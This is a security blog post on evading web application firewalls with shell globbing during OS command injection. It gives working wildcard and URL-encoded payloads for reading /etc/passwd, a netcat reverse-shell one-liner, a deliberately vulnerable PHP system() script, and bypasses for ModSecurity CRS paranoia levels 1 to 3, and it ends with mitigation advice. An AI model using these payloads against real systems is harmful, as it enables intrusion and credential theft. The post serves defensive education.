---
title: Bypassing Web Application Firewalls with Shell Globbing
date: 2025-01-26 10:00:00 +0530
categories: [Linux, Bash]
tags: [WAF, Linux, Bypass, Shell Globbing]
render_with_liquid: false
---

# Bypassing Web Application Firewalls with Shell Globbing

**Introduction**

Web Application Firewalls (WAFs) are a critical line of defense for modern web applications, meticulously inspecting incoming traffic to identify and block malicious requests. While they offer robust protection, WAFs are not infallible. Attackers are constantly innovating, devising new techniques to circumvent these security measures. One such technique, often overlooked, is the exploitation of shell globbing – a powerful feature inherent in Unix-like operating systems. This blog post delves into the intricacies of shell globbing, demonstrating how it can be strategically employed to evade WAFs and execute OS command injection attacks. We'll also explore the limitations of this approach, discuss essential mitigation strategies for robust web application security, and examine real-world examples, including specific WAF evasion scenarios.

As highlighted by the OWASP Top 10, "Injection" flaws are a major concern. Remote Command Execution (RCE) vulnerabilities, a subset of injection attacks, allow attackers to execute arbitrary commands on the server. While modern WAFs aim to block these attempts, Linux systems offer a variety of ways to bypass WAF rules. One of the penetration tester's biggest friends is "wildcard".

### Understanding Shell Globbing

Shell globbing, also known as wildcard expansion or filename generation, is a mechanism that allows the shell to interpret special characters as patterns, expanding them into matching filenames and directories on the filesystem *before* a command is executed. Think of it as a way to represent multiple files or paths with a single, concise pattern. The most common globbing characters are:

*   `*` (asterisk): Matches zero or more characters. For example, `file*` matches `file`, `file1`, `file_abc`, and `file_long_name`.
*   `?` (question mark): Matches exactly one character. For example, `file?` matches `file1`, `file2`, but not `file`, or `file12`.
*   `[...]` (square brackets): Matches any single character within the specified set. For example, `file[123]` matches `file1`, `file2`, or `file3`. You can also use ranges like `[a-z]` or `[0-9]`.

These globbing patterns, documented in `man 7 glob`, are often used in the command line.  However, the power to expand patterns with characters like `?`, `/`, numbers and letters allows for executing system commands and enumerating files.

### The Exploit: How Globbing Evades WAFs

WAFs often use pattern matching or regular expressions to detect malicious inputs. For instance, a WAF rule might block requests containing `/etc/passwd` or `/bin/ls` to prevent unauthorized access to the system's user database or execution of system commands. However, if the WAF only looks for the explicit string `/etc/passwd` , it is vulnerable to techniques leveraging globbing.

Here's how globbing comes into play:

1.  **Bypassing Direct String Matches:** Instead of sending `/etc/passwd` directly, an attacker might send `/e*c/p*s*d`. The shell expands `/e*c` to `/etc`, and `/p*s*d` to `passwd`. This bypasses the WAF's simple string match as it is not designed to detect expanded patterns. Similarly `/???/?s` expands to `/bin/ls`.

2.  **URL Encoding:** Globbing characters can be URL-encoded (e.g. `*` becomes `%2a`, `?` becomes `%3f`) to further obfuscate the attack and circumvent WAFs that might be attempting to detect those characters directly in the URL.

**Practical Examples: Shell Globbing in Action**

*   **Reading Sensitive Files:** To read `/etc/passwd`, instead of using `cat /etc/passwd`, the attacker might use `/?cmd=cat+/e*c/p*s*d` or even more obfuscated options, like `/?cmd=cat+%2fe%3fc%2fp%3fs%3fd` (using URL encoding). The command `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` is another way to accomplish the same goal.

*   **Enumerating Files and Directories:** The command `echo /*/*ss*` can list files and directories matching the pattern, such as `/etc/passwd`, `/var/log/messages`, or `/bin/bash`. You can also use `/?cmd=echo /*/*ss*` to achieve the same outcome via a vulnerable web application

*  **Executing Reverse Shells:** Establishing a reverse shell is a common goal of an attacker. Consider: `/???/n? -e /???/b??h 2130706433 1337` which translates to:

   * ` /???/n?` expands to `/bin/nc` (netcat).
   * `/???/b??h` expands to `/bin/bash`.
   * `2130706433` represents the IP address 127.0.0.1 in long integer format.
   * `1337` is the port.

    Note that if `nc` on your target doesn't have the `-e` flag, you may need to use `nc.traditional` or similar. In this case, the payload may look like: `/???/?c.??????????? -e /???/b??h 2130706433 1337`.

### Why Globbing Works: The WAF's Blind Spot

The effectiveness of globbing lies in the fact that many WAFs primarily focus on blocking known malicious strings *directly* in the input. They often do not interpret the expanded patterns that the shell will eventually execute. The WAF analyzes the request as it comes in from the user, before the server side shell expands it, leading to the bypass. This leaves a gap that attackers can exploit.

The `?` wildcard matches any single character. For example `ls *.???` will list files with three-character extensions like `.gif`, `.jpg` and `.txt`.

****

Let's consider a vulnerable PHP script:

```php
<?php
      echo 'ok: ';
      print_r($_GET['c']);
      system($_GET['c']);
?>
```

A direct RCE attempt, such as `/?cmd=cat+/etc/passwd`, may be blocked by Sucuri WAF with a message like "An attempted RFI/LFI was detected and blocked."  However, by utilizing wildcards and encoding, `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` can bypass the filter and execute the command, successfully reading `/etc/passwd`. This shows that a WAF can easily be bypassed if it is not configured with a sufficient paranoia level. It's important to note that this test uses a deliberately vulnerable PHP script and might not represent a realistic scenario, so WAFs should not be judged solely on how many requests they block on such a simple case.

**ModSecurity OWASP CRS and Paranoia Levels**

ModSecurity, especially with the libmodsecurity v3 and the OWASP Core Rule Set (CRS), is a powerful WAF solution.  The CRS utilizes "paranoia levels" (PL) to adjust the strictness of its rules.  Here's a breakdown of how they relate to globbing attacks:

*   **PL0:**  Many rules are disabled, making it very permissive. Globbing attacks will likely succeed.
*   **PL1:**  Aims for high-quality rules with low false positives, but it is still permissive. Allows most ASCII characters in the range of 1-255.
*   **PL2:** Similar to PL1, allowing most visible ASCII characters and some control characters like tab and newline. The ruleset allows ASCII characters 9,10,13 and between 32 and 126, and between 128 and 255.
*   **PL1 & PL2 in Action:**  With PL1 or PL2, ModSecurity might block a direct `cat /etc/passwd` attempt with an "OS File Access Attempt" rule (930120). However, globbing payloads such as `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` or `/bin/cat+/etc/passwd` may bypass these levels because `/`, `?` and space are in the allowed character set.
*  **PL3:** Introduces a rule blocking repetitive non-word characters.  For example, the rule blocks a request with too many `?`'s. The attack can still be achieved, as shown using a smaller number of wildcards: `c=/?in/cat+/et?/passw?`. The rule blocks ASCII characters between 32 and 36, and 38 and 126.
*   **PL4:**  Highly restrictive, blocking almost all characters outside of a very small range (a-z A-Z 0-9 = - \_ . , : &). This effectively prevents most globbing attacks.

### Mitigation Strategies: Strengthening Your Defenses

To safeguard against shell globbing and similar evasion techniques, consider the following mitigation strategies:

1.  **Advanced WAF Configuration:** Utilize a WAF with customizable rule sets and choose higher paranoia levels (when possible and appropriate). Explore options to block globbing characters and patterns.
2.  **Robust Input Validation:** Implement strict input validation on the server side to filter potentially dangerous characters *before* passing commands to the system shell. Sanitize, encode or reject inputs with suspicious characters.
3.  **Principle of Least Privilege:** Avoid running web applications with system-level privileges. Limit access to sensitive files.
4.  **Parameterize Commands:** Avoid directly using user input in shell commands. Instead, pass data as parameters or use safer functions.
5.  **Regular Log Monitoring:** Actively monitor logs for suspicious patterns and anomaly activities.
6.  **Security Audits:** Conduct regular security audits by a third party or penetration testers to identify vulnerabilities and misconfigurations.
7.  **Contextualize WAF Rules:** Don't apply generic WAF rules; instead, configure rules based on the specific functionality of each application.
8.  **Think Like an Attacker:** When creating WAF rules, consider how they could be evaded and design them to be robust against such techniques.

### Conclusion

Shell globbing is a potent technique that can bypass WAFs by exploiting their limitations in pattern recognition. While not foolproof, it highlights the importance of comprehensive security strategies. Organizations must focus on deploying advanced WAF configurations, performing robust input validation, and implementing comprehensive security measures to protect against these types of attack vectors. Remember, the battle for secure web applications requires constant vigilance and adaptation. Don't rely solely on WAFs, and instead adopt a layered security approach that includes secure coding practices, continuous monitoring and proactive security audits.
